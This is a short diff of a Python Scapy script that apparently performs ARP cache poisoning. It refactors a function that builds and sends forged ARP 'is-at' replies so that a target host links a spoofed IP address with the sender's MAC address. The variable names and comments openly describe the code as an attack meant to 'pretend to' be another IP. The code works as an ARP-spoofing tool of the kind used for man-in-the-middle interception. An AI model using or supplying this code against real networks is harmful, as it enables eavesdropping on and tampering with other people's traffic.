@@ -7,9 +7,9 @@ def getTargetMac(target : str , interface : str )->str : #get mac from ip
     reply = srp1(etherAttack/arpAttack , iface = interface,verbose=False)
     return reply[Ether].src
 
-def changeArpTable( target : str , src :str , srcMac : str ,interface : str )->None: #change arp tables if the ip we want to pretend to is already in the table 
-    etherAttack = Ether(dst =getTargetMac(target,interface) , src = srcMac)
-    arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
+def changeArpTable( targetIp : str , targetMac : str, src :str , srcMac : str ,interface : str )->None: #change arp tables if the ip we want to pretend to is already in the table 
+    etherAttack = Ether(dst = targetMac, src = srcMac)
+    arpAttack = ARP(pdst = targetIp, hwdst = targetMac, psrc = src, op = "is-at" )
     (etherAttack/arpAttack).show()
     sendp(etherAttack/arpAttack , iface=interface,verbose=False)
  
